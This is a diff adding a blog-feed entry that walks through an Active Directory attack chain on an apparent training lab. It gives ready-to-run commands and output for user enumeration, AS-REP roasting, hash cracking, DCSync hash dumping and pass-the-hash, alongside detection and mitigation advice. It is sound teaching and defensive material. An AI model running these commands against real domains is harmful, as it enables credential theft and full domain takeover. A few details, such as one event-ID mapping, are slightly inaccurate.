@@ -3,12 +3,515 @@
     <title>w4nn4d13</title>
     <link href="https://w4nn4d13.tech/feed.xml" rel="self" />
     <link href="https://w4nn4d13.tech" />
-    <updated>2026-06-27T23:50:31+05:30</updated>
+    <updated>2026-07-01T21:08:29+05:30</updated>
     <author>
         <name>w4nn4d13</name>
     </author>
     <id>https://w4nn4d13.tech</id>
 
+    <entry>
+        <title>Active Directory Attack Path Analysis</title>
+        <author>
+            <name>w4nn4d13</name>
+        </author>
+        <link href="https://w4nn4d13.tech/active-directory-attack-path-analysis/"/>
+        <id>https://w4nn4d13.tech/active-directory-attack-path-analysis/</id>
+            <category term="Security Research"/>
+            <category term="Desktop Application"/>
+            <category term="Application Security"/>
+
+        <updated>2026-07-01T21:08:29+05:30</updated>
+            <summary type="html">
+                <![CDATA[
+                    Disclaimer: This content is intended solely for educational purposes and authorized security testing in controlled environments. Unauthorized use against systems you do not own or have explicit permission to test is prohibited. Active Directory (AD) remains the dominant identity and access management solution in enterprise&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h1><figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/ChatGPT-Image-Jul-1-2026-09_06_00-PM.png" alt="" width="1983" height="793" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/ChatGPT-Image-Jul-1-2026-09_06_00-PM-2xl.png 1920w"></figure></h1>
+<blockquote>
+<p><span style="color: #e03e2d;"><span style="color: #ba372a;"><strong data-start="2" data-end="17" data-is-only-node="">Disclaimer:</strong></span> </span>This content is intended <strong data-start="43" data-end="110">solely for educational purposes and authorized security testing</strong> in controlled environments. Unauthorized use against systems you do not own or have explicit permission to test is prohibited.</p>
+</blockquote>
+<h2>Introduction</h2>
+<p>Active Directory (AD) remains the dominant identity and access management solution in enterprise environments, making it a primary target during internal penetration tests. A single misconfigured account or overlooked privilege can cascade into full domain compromise. This article presents a methodical AD attack chain  from an unauthenticated position to complete control over a Windows domain  explaining the underlying technology, the commands used, and the defensive gaps that enable each phase.</p>
+<p>The engagement begins with a single IP address and no credentials. The target is a Windows Domain Controller identified by its open ports and service banners. The scenario mirrors common enterprise misconfigurations: legacy authentication settings, weak service account passwords, improper delegation of replication privileges, and reliance on NTLM pass-the-hash vectors.</p>
+<p>The following sections walk through each phase of the attack, with an emphasis on the <em>why</em> behind each technique and the <em>how</em> to detect or prevent it.</p>
+<h2>Network Reconnaissance</h2>
+<p>Every penetration test begins with discovery. The goal of this phase is to identify the target's role, operating system, domain affiliation, and the services it exposes to the network.</p>
+<pre><code>nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 -sV -T4 &lt;TARGET_IP&gt;
+</code></pre>
+<p>This scan targets the standard Active Directory service ports. Each port corresponds to a specific protocol essential to domain operations:</p>
+<ul>
+<li><strong>53/TCP (DNS):</strong> Domain Name Service is integral to AD for locating domain controllers and resolving domain resources.</li>
+<li><strong>88/TCP (Kerberos):</strong> The core authentication protocol for AD. Kerberos issues tickets that grant access to domain resources without re-entering credentials.</li>
+<li><strong>135/TCP (RPC Endpoint Mapper):</strong> Used by Windows for inter-process communication and service discovery.</li>
+<li><strong>389/TCP (LDAP):</strong> Lightweight Directory Access Protocol — the primary query interface for reading and writing to the AD database.</li>
+<li><strong>445/TCP (SMB):</strong> Server Message Block — the file-sharing and named-pipe transport protocol. SMB is frequently abused for enumeration, credential harvesting, and lateral movement.</li>
+<li><strong>5985/TCP (WinRM):</strong> Windows Remote Management — provides remote PowerShell and command execution capabilities over HTTP.</li>
+</ul>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-40-53.png" alt="" width="1039" height="506" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-40-53-2xl.png 1920w"></figure>
+<pre><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+                              (Domain: spookysec.local)
+445/tcp   open  microsoft-ds
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
+</code></pre>
+<p>The LDAP banner leaks the domain name (<code>spookysec.local</code>). The presence of Kerberos, LDAP, and SMB on a single host, combined with port 5985 (WinRM) and 3389 (RDP), identifies this system as a Domain Controller running Windows Server 2019 (build 17763).</p>
+<p><strong>Why this matters:</strong> Identifying a Domain Controller early informs every subsequent decision. All Kerberos requests, LDAP queries, and SMB interactions will be directed at this host using the discovered domain name.</p>
+<h2>Domain Enumeration</h2>
+<p>With the domain name identified, the next step is to verify domain controller properties and confirm the attack surface via SMB negotiation.</p>
+<pre><code>netexec smb &lt;TARGET_IP&gt;
+</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-42-39.png" alt="" width="1533" height="71" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-42-39-2xl.png 1920w"></figure>
+<p>The <code>netexec</code> tool (formerly CrackMapExec) sends an SMB protocol negotiation request. The response from the server includes the NetBIOS domain name, the DNS domain name, the hostname, the operating system version, and whether SMB signing is enforced.</p>
+<pre><code>SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64
+              (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
+</code></pre>
+<p>Key findings:</p>
+<ul>
+<li><strong>Domain:</strong> <code>spookysec.local</code></li>
+<li><strong>Hostname:</strong> <code>ATTACKTIVEDIREC</code></li>
+<li><strong>OS Build:</strong> 17763 (Windows Server 2019)</li>
+<li><strong>SMB Signing:</strong> Enabled (mutual authentication required for SMB connections)</li>
+<li><strong>SMBv1:</strong> Disabled (a positive security finding — SMBv1 was disabled by default after MS17-010)</li>
+</ul>
+<p><strong>SMB signing</strong> being enabled means NTLM relay attacks against SMB targets will not work between signed hosts, but it does not prevent authenticated SMB access or Kerberos-based attacks.</p>
+<h2>User Enumeration</h2>
+<p>With a domain name but no credentials, the next objective is to discover valid user accounts. Kerberos provides an ideal oracle for this purpose because its error codes differ between existing and non-existing accounts.</p>
+<h3>Kerberos User Enumeration with Kerbrute</h3>
+<p>The Kerberos protocol defines specific error messages during the authentication service request (AS-REQ) phase:</p>
+<ul>
+<li><strong>KRB5KDC_ERR_PREAUTH_REQUIRED (0x25):</strong> The user exists but pre-authentication is required. This is the normal response for a valid user.</li>
+<li><strong>KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN (0x6):</strong> The user does not exist in the domain.</li>
+</ul>
+<p>These distinct responses allow unauthenticated enumeration of domain users by simply sending AS-REQ messages with candidate usernames and observing the error code returned.</p>
+<pre><code>kerbrute userenum -d spookysec.local --dc &lt;TARGET_IP&gt; /wordlists/users.txt
+</code></pre>
+<pre><code>2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  james@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  svc-admin@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  robin@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  darkstar@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  administrator@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  backup@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  paradox@spookysec.local
+2026/07/01 19:58:31 &gt;  [+] VALID USERNAME:  ori@spookysec.local
+</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-45-44.png" alt="" width="724" height="539" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-45-44-2xl.png 1920w"></figure>
+<p>Eight valid domain users are identified. Among them, <code>svc-admin</code> and <code>backup</code> stand out as potentially privileged service accounts. The <code>administrator</code> account is also confirmed, which is valuable for later pass-the-hash validation.</p>
+<p><strong>Why this matters:</strong> Without this enumeration step, subsequent AS-REP roasting attempts would be blind. Knowing which accounts exist enables targeted attacks against misconfigured users.</p>
+<h3>Defensive Consideration</h3>
+<p>Kerbrute enumeration cannot be prevented by disabling pre-authentication alone — it exploits the fundamental Kerberos error code differentiation. Defenses include:</p>
+<ul>
+<li>Monitoring Event ID 4768 (Kerberos TGT requested) for anomalous volumes of AS-REQ failures from a single source.</li>
+<li>Enabling Kerberos armoring (FAST) where supported, which protects the initial AS-REQ exchange.</li>
+<li>Restricting network access to port 88/TCP to only authorized domain members.</li>
+</ul>
+<h2>AS-REP Roasting</h2>
+<h3>Background: Kerberos Pre-Authentication</h3>
+<p>In standard Kerberos authentication, the Authentication Service Request (AS-REQ) includes a timestamp encrypted with the user's NTLM hash. This pre-authentication data proves to the Key Distribution Center (KDC) that the requester knows the user's password before any ticket is issued. If the KDC cannot decrypt the timestamp, it refuses the request.</p>
+<p>However, Active Directory allows accounts to be configured with the <strong>"Do not require Kerberos pre-authentication"</strong> flag (<code>UF_DONT_REQUIRE_PREAUTH</code>). This legacy setting was originally designed for compatibility with non-Windows Kerberos implementations that could not perform pre-authentication. When this flag is set, the KDC will issue an encrypted Ticket Granting Ticket (TGT) to <strong>anyone</strong> who requests one for that user — without any proof of password knowledge.</p>
+<h3>The Attack</h3>
+<p>The TGT returned by the KDC is encrypted with the user's NTLM hash. An attacker who captures this TGT can extract the encrypted portion and attempt to crack it offline using a dictionary or brute-force attack.</p>
+<pre><code></code><code>a.py spookysec.local/ -dc-ip &lt;TARGET_IP&gt; -usersfile valid_users.txt -request -format hashcat
+</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/2026-07-01_20-48.png" alt="" width="1905" height="274" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/2026-07-01_20-48-2xl.png 1920w"></figure>
+<p>This tool from the Impacket suite sends an AS-REQ for each user <strong>without</strong> pre-authentication data. If the user has the <code>DONT_REQUIRE_PREAUTH</code> flag set, the KDC returns an AS-REP containing an encrypted TGT. The output is formatted for Hashcat (mode 18200).</p>
+<pre><code>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e2ff9604df420fa561af327bfb1f3540$...
+[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User robin doesn't have UF_DONT_REQUIR_PREAUTH se
+...
+</code></pre>
+<p>Only <code>svc-admin</code> has the pre-authentication flag disabled. The returned hash is then cracked using Hashcat in mode 18200 (Kerberos 5 AS-REP etype 23 — RC4-HMAC):</p>
+<pre><code>hashcat -m 18200 hash.txt /wordlists/passwords.txt --force
+</code></pre>
+<pre><code>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...:management2005
+</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-51-34-2.png" alt="" width="1910" height="902" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-51-34-2-2xl.png 1920w"></figure>
+<p><strong>Recovered credential:</strong> <code>svc-admin:management2005</code></p>
+<h3>Why This Worked</h3>
+<p>The <code>svc-admin</code> account had two exploitable conditions:</p>
+<ol>
+<li><strong>Kerberos pre-authentication disabled</strong> — allowing unauthenticated TGT requests.</li>
+<li><strong>Weak password (<code>management2005</code>)</strong> — the RC4-HMAC hash was cracked near-instantly against a modest wordlist.</li>
+</ol>
+<h3>Detection</h3>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>Source</th>
+<th>Event ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kerberos TGT request without pre-auth</td>
+<td>Domain Controller Security Log</td>
+<td>4768 (with Pre-Authentication field = false)</td>
+</tr>
+<tr>
+<td>AS-REP hash retrieval (TGS-REQ for unusual SPN)</td>
+<td>Domain Controller</td>
+<td>4769</td>
+</tr>
+</tbody>
+</table>
+<h3>Mitigation</h3>
+<ol>
+<li>
+<p>Audit all accounts with <code>DONT_REQUIRE_PREAUTH</code> set using PowerShell:</p>
+<pre><code class="language-powershell">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+</code></pre>
+</li>
+<li>
+<p>Enable pre-authentication on any account that does not require it for legacy compatibility.</p>
+</li>
+<li>
+<p>Enforce strong password policies for all service accounts.</p>
+</li>
+<li>
+<p>Use Group Managed Service Accounts (gMSAs) for services where possible.</p>
+</li>
+</ol>
+<h2>SMB Enumeration</h2>
+<p>With valid credentials (<code>spookysec.local\svc-admin:management2005</code>), the next phase is to enumerate accessible resources on the domain controller.</p>
+<h3>Enumerating Network Shares</h3>
+<p>SMB shares often contain configuration files, scripts, backups, or other sensitive data. The <code>--shares</code> flag enumerates all available shares and their access permissions.</p>
+<pre><code>netexec smb &lt;TARGET_IP&gt; -u 'svc-admin' -p 'management2005' --shares
+</code></pre>
+<pre><code>SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  Share           Permissions
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  -----           -----------
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  ADMIN$          (Remote Admin)
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  backup          READ
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  IPC$            READ
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  NETLOGON        READ
+SMB         &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  SYSVOL          READ
+</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-54-25.png" alt="" width="1544" height="259" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-54-25-2xl.png 1920w"></figure>
+<p>The <code>backup</code> share is notable — it is not a default AD share (unlike ADMIN$, C$, NETLOGON, SYSVOL, and IPC$) and appears to be custom-created. It is readable by svc-admin.</p>
+<h3>Accessing the Backup Share</h3>
+<pre><code>smbclient //&lt;TARGET_IP&gt;/backup -U 'spookysec.local\svc-admin'
+</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-56-02.png" alt="" width="997" height="620" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-56-02-2xl.png 1920w"></figure>
+<p>Inside the share, a single file is found:</p>
+<pre><code>backup_credentials.txt    (48 bytes)
+</code></pre>
+<p>Downloading and examining the file reveals a Base64-encoded string:</p>
+<pre><code>YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-57-25.png" alt="" width="1291" height="620" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-57-25-2xl.png 1920w"></figure>
+<p>Base64 is a binary-to-text encoding scheme, not encryption. Decoding is trivial:</p>
+<pre><code>backup@spookysec.local:backup2517860
+</code></pre>
+<p>This yields credentials for the <code>backup</code> domain user.</p>
+<h3>Why This Worked</h3>
+<ul>
+<li>Plaintext credentials were stored in an SMB share accessible to a low-privilege service account.</li>
+<li>The file used Base64 encoding, which provides no real security — it is easily reversible by anyone with access to the file.</li>
+<li>The share was readable by <code>svc-admin</code>, which should never have access to backup credentials.</li>
+</ul>
+<h3>Detection</h3>
+<ul>
+<li>Monitor Event ID 5140 (share object accessed) for anomalous access to non-standard shares.</li>
+<li>Audit file permission changes on sensitive shares.</li>
+</ul>
+<h3>Mitigation</h3>
+<ul>
+<li>Never store credentials in SMB shares accessible to non-privileged accounts.</li>
+<li>Use Windows Credential Manager, LAPS, or a secrets management solution (e.g., HashiCorp Vault).</li>
+<li>Restrict share permissions using the principle of least privilege.</li>
+<li>Encrypt sensitive files at rest; Base64 does not constitute encryption.</li>
+</ul>
+<h2>Privilege Escalation: DCSync</h2>
+<h3>Background: Active Directory Replication</h3>
+<p>Domain Controllers replicate their database (NTDS.dit) among themselves using the Directory Replication Service (DRS) protocol, exposed via the MS-DRSR RPC interface. This replication mechanism allows DCs to synchronize password hashes, group memberships, and all other directory objects.</p>
+<p>Certain accounts — notably those in the <code>Domain Controllers</code> group and accounts delegated with specific replication rights — can initiate replication requests. Two extended rights control this capability:</p>
+<ul>
+<li><strong>DS-Replication-Get-Changes</strong> (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd1)</li>
+<li><strong>DS-Replication-Get-Changes-All</strong> (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd1)</li>
+</ul>
+<p>An account with these rights can impersonate a Domain Controller and request replication of the entire AD database, including all password hashes. This is the <strong>DCSync</strong> attack.</p>
+<h3>Executing DCSync</h3>
+<p>The <code>backup</code> account was configured with these replication rights. This is a known pattern — backup software often requires the ability to read all directory objects, and the easiest way to grant this is through the "Replicating Directory Changes All" permission on the domain root.</p>
+<pre><code>netexec smb &lt;TARGET_IP&gt; -u 'backup' -p 'backup2517860' --ntds
+</code></pre>
+<pre><code>SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860
+SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+...
+SMB   &lt;TARGET_IP&gt;  445  ATTACKTIVEDIREC  [+] Dumped 18 NTDS hashes
+</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-20-58-54.png" alt="" width="1910" height="603" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-20-58-54-2xl.png 1920w"></figure>
+<p>The <code>netexec</code> tool leverages the backup account's replication privileges to request a full copy of the NTDS.dit database. The output contains every domain user's NT hash (the first component after the RID) and LM hash (the first hex string, typically <code>aad3b435b51404eeaad3b435b51404ee</code> indicating "no LM hash stored").</p>
+<p>Of particular interest:</p>
+<ul>
+<li><strong>Administrator NTLM:</strong> <code>0e0363213e37b94221497260b0bcb4fc</code></li>
+<li><strong>krbtgt NTLM:</strong> <code>0e2eb8158c27bed09861033026be4c21</code></li>
+</ul>
+<p>The krbtgt hash is especially sensitive — it is used to sign all Kerberos Ticket Granting Tickets in the domain. Compromise of krbtgt enables <strong>Golden Ticket</strong> attacks, allowing an attacker to forge TGTs for any user (including non-existent ones) indefinitely.</p>
+<h3>Why This Worked</h3>
+<ul>
+<li>The <code>backup</code> account was granted <strong>DS-Replication-Get-Changes-All</strong> on the domain root.</li>
+<li>This is a common misconfiguration when administrators grant backup applications excessive privileges rather than scoping them to specific OUs or using granular delegated permissions.</li>
+<li>The backup account had a weak password (<code>backup2517860</code>) that could itself be cracked if needed.</li>
+</ul>
+<h3>Detection</h3>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>Source</th>
+<th>Event ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DS-Replication-Get-Changes-All</td>
+<td>Domain Controller Security Log</td>
+<td>4662 (Access to an Active Directory object)</td>
+</tr>
+<tr>
+<td>Replication attempt from non-DC source</td>
+<td>Directory Service</td>
+<td>4928, 4929</td>
+</tr>
+</tbody>
+</table>
+<p>The key detection signal is a <strong>replication request originating from a non-Domain Controller system</strong>. Domain Controllers replicate among themselves as a matter of course, but a workstation or server should never initiate replication.</p>
+<h3>Mitigation</h3>
+<ol>
+<li>
+<p>Audit the <code>Replicating Directory Changes</code> permissions on the domain root:</p>
+<pre><code class="language-powershell">Get-ACL "AD:DC=spookysec,DC=local" | Select -ExpandProperty Access | Where {$_.ActiveDirectoryRights -match "Replicating"}
+</code></pre>
+</li>
+<li>
+<p>Remove these permissions from all non-DC accounts.</p>
+</li>
+<li>
+<p>Use dedicated backup solutions that do not require DCSync capabilities (e.g., Windows Server Backup).</p>
+</li>
+<li>
+<p>Monitor for Event ID 4662 where the AccessMask corresponds to <code>DS-Replication-Get-Changes</code> (0x100).</p>
+</li>
+</ol>
+<h2>Pass-the-Hash</h2>
+<h3>Background: NTLM Authentication Flow</h3>
+<p>NTLM is a challenge-response authentication protocol. The flow is:</p>
+<ol>
+<li>The client sends a <code>negotiate</code> message requesting authentication.</li>
+<li>The server responds with an 8-byte random challenge.</li>
+<li>The client encrypts this challenge using the user's NTLM hash and sends it back as the <code>authenticate</code> message.</li>
+<li>The server (or a Domain Controller) independently computes the expected response using the stored NTLM hash and compares.</li>
+</ol>
+<p>Critically, <strong>the NTLM hash is the only secret needed to compute the correct response</strong>. The plaintext password is never required. If an attacker possesses the NTLM hash, they can authenticate as that user without knowing the password.</p>
+<h3>Pass-the-Hash via WinRM</h3>
+<p>Windows Remote Management (WinRM) accepts NTLM authentication. With the Administrator's NTLM hash extracted from the DCSync dump, we can authenticate directly:</p>
+<pre><code>netexec winrm &lt;TARGET_IP&gt; -u 'Administrator' -H 0e0363213e37b94221497260b0bcb4fc -d 'spookysec.local' -X 'whoami'
+</code></pre>
+<pre><code>WINRM   &lt;TARGET_IP&gt;  5985  &lt;TARGET_IP&gt;  [+] spookysec.local\Administrator (Pwn3d!)
+WINRM   &lt;TARGET_IP&gt;  5985  &lt;TARGET_IP&gt;  thm-ad\administrator
+</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/20/Screenshot-From-2026-07-01-21-00-10-2.png" alt="" width="1910" height="150" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-xs.png 640w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-sm.png 768w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-md.png 1024w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-lg.png 1366w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-xl.png 1600w ,https://w4nn4d13.tech/media/posts/20/responsive/Screenshot-From-2026-07-01-21-00-10-2-2xl.png 1920w"></figure>
+<p>The <code>(Pwn3d!)</code> indicator confirms full administrative access on the target. We are now executing commands in the security context of the Domain Administrator.</p>
+<h3>Why This Worked</h3>
+<ul>
+<li>The NTLM hash was recoverable through the DCSync attack, which was possible because the backup account had excessive replication privileges.</li>
+<li>WinRM was enabled on the Domain Controller, providing a remote command execution channel.</li>
+<li>No additional factor (Credential Guard, Just Enough Administration, or network segmentation) prevented hash reuse.</li>
+</ul>
+<h3>Detection</h3>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>Source</th>
+<th>Event ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Logon with explicit credentials</td>
+<td>Target System Security Log</td>
+<td>4648 (if explicit)</td>
+</tr>
+<tr>
+<td>Network logon from non-DC host</td>
+<td>Domain Controller Security Log</td>
+<td>4624 (Logon Type 3 or 10)</td>
+</tr>
+</tbody>
+</table>
